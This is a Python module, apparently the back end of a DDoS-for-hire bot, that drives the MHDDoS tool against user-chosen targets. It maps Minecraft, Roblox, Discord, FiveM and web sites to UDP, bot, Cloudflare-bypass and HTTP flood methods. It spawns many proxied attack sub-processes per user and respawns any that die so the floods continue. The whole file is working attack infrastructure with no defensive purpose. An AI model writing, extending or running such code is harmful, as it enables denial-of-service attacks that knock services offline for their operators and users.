# mhddos_engine.py
import asyncio
import os
import sys
import time
import traceback
from config import (
    MHDDOS_FULL, MHDDOS_DIR, MHDDOS_LAUNCHER,
    SUB_NODES_PER_DEVICE, THREADS_PER_SUB_NODE, RPC_PER_SUB_NODE,
    MAX_RESPAWN_ATTEMPTS, RESPAWN_DELAY, ATTACK_LOG_DIR,
    proxy_slice_file,
)

MODULE_MAP = {
    "minecraft":  ("L4", "MCBOT",  {}),
    "roblox":     ("L4", "UDP",    {}),
    "discord":    ("L4", "UDP",    {}),
    "fivem":      ("L4", "FIVEM",  {}),
    "web":        ("L7", "STRESS", {}),   # ← เปลี่ยนจาก CFB → STRESS (ไม่ต้อง proxy)
    "web_cf":     ("L7", "CFB",    {}),
    "web_bypass": ("L7", "BYPASS", {}),
    "http_flood": ("L7", "GET",    {}),
}

L4_MODULES = {"minecraft", "roblox", "discord", "fivem"}


class MHDDoSEngine:
    def __init__(self):
        # user_id → list of node dict:
        #   {"proc", "args", "log_path", "respawns"}
        self.running: dict[int, list[dict]] = {}

    # ── command builder ──
    def _build_args(self, method: str, layer: str, target: str, port: int,
                    duration: int, threads: int,
                    proxies_path: str, rpc: int) -> list[str]:
        if layer == "L7":
            host = target if target.startswith("http") else f"http://{target}"
            if port and ":" not in host.split("//")[-1]:
                host = f"{host}:{port}"
            return [
                method, host, "5", str(threads),
                proxies_path, str(rpc), str(duration),
            ]
        else:
            host = target.split("//")[-1].split("/")[0]
            if ":" not in host:
                host = f"{host}:{port}"
            return [method, host, str(threads), str(duration)]

    # ── spawn 1 node ──
    async def _spawn_node(self, user_id: int, node_idx: int,
                          args: list[str]) -> dict:
        os.makedirs(ATTACK_LOG_DIR, exist_ok=True)
        log_path = os.path.join(
            ATTACK_LOG_DIR, f"{user_id}_{node_idx}_{int(time.time())}.log"
        )
        log_f = open(log_path, "wb")

        cmd = [sys.executable, MHDDOS_LAUNCHER] + args
        proc = await asyncio.create_subprocess_exec(
            *cmd,
            stdout=log_f,
            stderr=asyncio.subprocess.STDOUT,
            cwd=MHDDOS_DIR,
        )
        log_f.close()

        return {
            "proc": proc,
            "args": args,
            "log_path": log_path,
            "respawns": 0,
            "node_idx": node_idx,
        }

    # ── start ──
    async def start(self, user_id: int, module: str, target: str, port: int,
                    duration: int, devices: int,
                    proxy_slices: list[list[str]]):
        if user_id in self.running:
            raise RuntimeError("มี attack รันอยู่แล้ว")

        info = MODULE_MAP.get(module)
        if not info:
            raise ValueError(f"unknown module: {module}")
        layer, method, _ = info

        sub_nodes = devices * SUB_NODES_PER_DEVICE

        # เตรียม slice file ทุก sub-node
        for i in range(sub_nodes):
            data = proxy_slices[i] if i < len(proxy_slices) else []
            path = proxy_slice_file(user_id, i)
            with open(path, "w") as f:
                f.write("\n".join(data))

        # spawn ทุก node
        nodes: list[dict] = []
        for i in range(sub_nodes):
            args = self._build_args(
                method, layer, target, port, duration,
                THREADS_PER_SUB_NODE, proxy_slice_file(user_id, i),
                RPC_PER_SUB_NODE,
            )
            try:
                node = await self._spawn_node(user_id, i, args)
                nodes.append(node)
            except Exception:
                traceback.print_exc()
            await asyncio.sleep(0.05)

        if not nodes:
            raise RuntimeError("spawn sub-process ไม่สำเร็จแม้แต่ตัวเดียว")

        self.running[user_id] = nodes
        return nodes

    # ── respawn dead node ──
    async def _respawn(self, user_id: int, node: dict) -> bool:
        if node["respawns"] >= MAX_RESPAWN_ATTEMPTS:
            return False
        await asyncio.sleep(RESPAWN_DELAY)
        try:
            new_node = await self._spawn_node(
                user_id, node["node_idx"], node["args"]
            )
            new_node["respawns"] = node["respawns"] + 1
            # แทนที่ในตำแหน่งเดิม
            nodes = self.running.get(user_id, [])
            for i, n in enumerate(nodes):
                if n is node:
                    nodes[i] = new_node
                    break
            return True
        except Exception:
            traceback.print_exc()
            return False

    # ── background: ตรวจ + respawn ──
    async def _watcher(self, user_id: int):
        while True:
            await asyncio.sleep(3)
            nodes = self.running.get(user_id)
            if not nodes:
                return
            for node in list(nodes):
                proc = node["proc"]
                if proc.returncode is not None:
                    await self._respawn(user_id, node)

    # ── stop ──
    async def stop(self, user_id: int):
        nodes = self.running.pop(user_id, [])
        if not nodes:
            return
        for node in nodes:
            proc = node["proc"]
            if proc.returncode is None:
                try:
                    proc.terminate()
                except Exception:
                    pass
        for node in nodes:
            proc = node["proc"]
            if proc.returncode is None:
                try:
                    await asyncio.wait_for(proc.wait(), timeout=3)
                except asyncio.TimeoutError:
                    try:
                        proc.kill()
                    except Exception:
                        pass
                except Exception:
                    pass
        for node in nodes:
            try:
                os.remove(node["log_path"])
            except OSError:
                pass
        # ลบ slice files
        for i in range(50):  # เผื่อ
            try:
                os.remove(proxy_slice_file(user_id, i))
            except OSError:
                break

    # ── status ──
    def is_running(self, user_id: int) -> bool:
        nodes = self.running.get(user_id, [])
        return any(n["proc"].returncode is None for n in nodes)

    def alive_count(self, user_id: int) -> tuple[int, int]:
        nodes = self.running.get(user_id, [])
        alive = sum(1 for n in nodes if n["proc"].returncode is None)
        return alive, len(nodes)

    async def shutdown_all(self):
        for uid in list(self.running.keys()):
            await self.stop(uid)